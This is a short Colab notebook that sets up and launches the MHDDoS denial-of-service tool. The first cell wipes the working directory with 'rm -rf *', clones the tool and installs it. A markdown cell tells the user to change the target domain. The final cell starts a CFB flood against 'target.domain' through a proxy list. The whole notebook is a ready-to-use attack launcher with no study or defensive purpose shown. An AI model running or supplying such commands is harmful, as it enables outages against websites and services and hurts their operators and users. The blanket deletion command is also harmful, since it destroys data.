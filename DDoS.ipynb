{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!rm -rf * && git clone https://github.com/MHProDev/MHDDoS.git dos && mv dos/* . && rm -rf dos && pip3 install --no-cache-dir -r requirements.txt"
      ],
      "metadata": {
        "id": "dOlXscAmJ82w"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "[**README**](https://telegra.ph/DoS-03-12)\n",
        "\n",
        "`Don't forget to change your tergat domain`"
      ],
      "metadata": {
        "id": "Ji4EbcQwTat-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!python3 start.py CFB target.domain 0 894 proxy.txt 61 1693"
      ],
      "metadata": {
        "id": "zFtrWTutYEHJ"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "DoS",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
